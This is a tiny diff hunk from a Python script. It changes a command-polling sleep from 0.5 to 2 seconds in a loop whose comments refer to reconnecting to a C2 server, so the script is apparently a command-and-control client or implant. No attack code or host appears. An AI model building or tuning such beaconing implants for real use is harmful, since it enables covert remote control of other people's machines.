@@ -186,4 +186,4 @@ if __name__ == "__main__":
             #print(f"[!] Reconnection to C2 server failed!\n{e}\n")
 
         # How frequent request a command
-        time.sleep(0.5)
+        time.sleep(2)
